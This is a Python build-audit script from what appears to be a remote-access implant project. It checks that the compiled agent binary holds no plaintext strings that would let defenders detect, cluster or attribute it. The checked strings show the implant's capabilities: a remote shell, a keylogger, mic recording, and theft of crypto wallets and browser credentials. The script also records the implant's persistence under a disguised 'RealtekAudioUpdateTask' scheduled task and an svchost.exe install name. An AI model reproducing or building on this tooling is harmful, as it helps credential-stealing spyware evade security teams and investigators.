#!/usr/bin/env python3
"""Audit the sentinel binary for residual plaintext leaks.

Two modes:
  default     - print findings, exit 0 (informational)
  --strict    - exit 1 if any MUST-NOT-APPEAR pattern is found

Usage:
  python tests/audit_strings.py build/sentinel_tg_silent.exe
  python tests/audit_strings.py --strict build/sentinel_tg_silent.exe

Exit codes:
  0  no must-not-appear patterns found
  1  --strict mode found at least one leak
  2  file not found / argument error
"""
import re
import sys
from pathlib import Path

# MUST-NOT-APPEAR patterns. If any of these show up in the binary,
# something has regressed (a literal got re-introduced, an `encodeObf`
# call got deleted, etc). The build script runs this in --strict mode
# so a regression fails the build.
MUST_NOT_APPEAR = [
    # The 43-line contiguous help blob. Any single-line fragment is
    # enough to know the blob got re-introduced.
    ("/cmd <cmd>            run shell command", "help blob (was 43-line contiguous)"),
    ("available commands:", "help blob header"),
    ("ETH keystore / BTC wallet", "help blob /exfil wallet line"),
    ("/keys start|stop      keylogger", "help blob /keys line"),
    ("/exfil wallet         ETH keystore", "help blob /exfil wallet line"),
    ("/mic <seconds>        record mic audio", "help blob /mic line"),
    ("Chrome/Edge SQLite + Local State", "help blob /exfil browser line"),

    # Old build prefix and log filename. The X7K constant was a free
    # cross-sample clustering key; if it comes back, every agent log
    # can be linked.
    ("X7K", "old BuildPrefix constant"),
    ("svc-X7K", "old log filename svc-X7K.log"),

    # Old passphrase. Its plaintext was a project roadmap + fiscal
    # quarter. Anyone who recovered it had attribution.
    ("sentinel-engagement", "old S_AGENT_SECRET passphrase"),
    ("echo-tango-whiskey", "old S_AGENT_SECRET passphrase fragment"),

    # Old online banner. Project name in plaintext, sent over the wire.
    ("SentinelC2 / Sentinel", "old initialOnline banner"),

    # EDR-list entries that collided with the project name. Gave
    # defenders a free cross-reference linking samples to the source.
    ("sentinelagent.exe", "EDR list collision with project name"),
    ("sentinelranger.exe", "EDR list collision with project name"),

    # Old install path (svchost.exe in ProgramData\Microsoft\Network...).
    # No longer used after the disguise-consolidation refactor.
    ("Microsoft\\\\Network\\\\Connections\\\\Cm", "old install path"),
    ("Svchost.exe", "old install name svchost.exe"),
]

# INTENTIONAL plaintext - must remain for persistence/UI to work.
# Listed here for transparency, not as a check.
INTENTIONAL = [
    ("RealtekAudioUpdateTask", "scheduled task name (registry / schtasks)"),
    ("Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", "Run-key path (now S_PERSIST_RUN, encoded)"),
]


def main():
    args = sys.argv[1:]
    if not args:
        print("usage: audit_strings.py [--strict] <exe path>")
        sys.exit(2)

    strict = False
    if "--strict" in args:
        strict = True
        args.remove("--strict")

    if len(args) != 1:
        print("usage: audit_strings.py [--strict] <exe path>")
        sys.exit(2)

    path = Path(args[0])
    if not path.exists():
        print(f"file not found: {path}")
        sys.exit(2)

    data = path.read_bytes()

    print(f"=== Audit: {path.name} ({len(data)} bytes) ===")
    print()
    print(f"--- {len(MUST_NOT_APPEAR)} MUST-NOT-APPEAR patterns ---")
    leaks = []
    for pattern, label in MUST_NOT_APPEAR:
        hits = list(re.finditer(re.escape(pattern.encode('ascii', errors='ignore')),
                                data, re.IGNORECASE))
        if hits:
            leaks.append((pattern, label, hits))
            print(f"  [LEAK]  {pattern!r}")
            print(f"          ({label})")
            for h in hits[:2]:
                ctx = data[max(0, h.start()-12):h.end()+12]
                print(f"          @ 0x{h.start():x}: {ctx!r}")
        else:
            print(f"  [OK]    {pattern!r}")

    print()
    print(f"--- {len(INTENTIONAL)} INTENTIONAL plaintext (for reference) ---")
    for pattern, label in INTENTIONAL:
        hits = list(re.finditer(re.escape(pattern.encode('ascii', errors='ignore')),
                                data, re.IGNORECASE))
        status = "[INTENTIONAL]" if hits else "[ABSENT]"
        print(f"  {status:13s}  {pattern!r:50s} ({label})")

    print()
    if leaks:
        print(f"=== {len(leaks)} MUST-NOT-APPEAR patterns leaked ===")
        if strict:
            print("STRICT mode: exiting with code 1 (build should fail)")
            sys.exit(1)
        print("(informational mode: exiting with code 0)")
        sys.exit(0)

    print("=== Audit passed: no known plaintext leaks ===")
    sys.exit(0)


if __name__ == "__main__":
    main()
